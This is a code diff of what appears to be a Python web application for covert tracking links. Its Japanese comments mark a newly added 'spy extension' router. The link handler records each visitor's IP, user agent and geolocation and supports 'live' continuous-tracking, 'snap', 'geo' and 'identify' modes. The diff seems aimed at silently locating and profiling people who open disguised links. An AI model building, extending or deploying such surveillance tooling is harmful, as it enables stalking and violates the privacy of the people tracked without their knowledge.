@@ -19,7 +19,7 @@ from . import identity, watcher, forensics, linktrack, together, snscheck, campa
 
 config.load()
 users.init()
-persist.pull_accounts()      # ← これだけ追加
+persist.pull_accounts()
 db = tenancy.db
 persist.start()
 
@@ -41,10 +41,12 @@ admin = APIRouter(prefix=ADMIN_PATH)
 # --- マルチSNS（新規） ---
 from . import snsx
 app.include_router(snsx.router)
-# --- 追跡（新規） ---        ← ここから2行を追加
+# --- 追跡（新規） ---
 from . import tracks
 app.include_router(tracks.router)
-app.include_router(snsx.router)
+# --- スパイ拡張（新規） ---
+from . import spy
+app.include_router(spy.router)
 
 # ---------- Instagram 接続の状態管理 ----------
 
@@ -673,8 +675,7 @@ def admin_delete(target: str, purge: str = Form(""), u=Depends(admin_auth)):
     if purge:
         shutil.rmtree(os.path.join(tenancy.ROOT, tenancy.safe_name(target)),
                       ignore_errors=True)
-        with tenancy._lock:
-            tenancy._dbs.pop(tenancy.safe_name(target), None)
+        tenancy.close(target)
     users.audit(u, "admin_delete", {"username": target, "purge": bool(purge)})
     return RedirectResponse(ADMIN_PATH + "/?msg=" + quote(f"{target} を削除しました"), 303)
 
@@ -1325,7 +1326,6 @@ def link_hit(code: str, request: Request):
                       p=linktrack.parse_ua(request.headers.get("user-agent", "")),
                       g=linktrack.geo(ip))
 
-    # ↓ 追加：連続追跡モード
     if link["mode"] == "live":
         return render("link_live.html", request, code=code, hit_id=hid, link=link,
                       dest=link["dest"] or "", nonce=nonce,
@@ -1483,7 +1483,6 @@ def links_add(name: str = Form(""), dest: str = Form(""), note: str = Form(""),
               mode: str = Form("page"), u=Depends(auth)):
     code = _new_code()
     users.register_link(code, u)
-    # "snap" / "live" も許可（追跡テーブルとして作る）
     m = mode if mode in ("page", "geo", "redirect", "quiz", "identify",
                          "snap", "live") else "page"
     if m in ("snap", "live"):
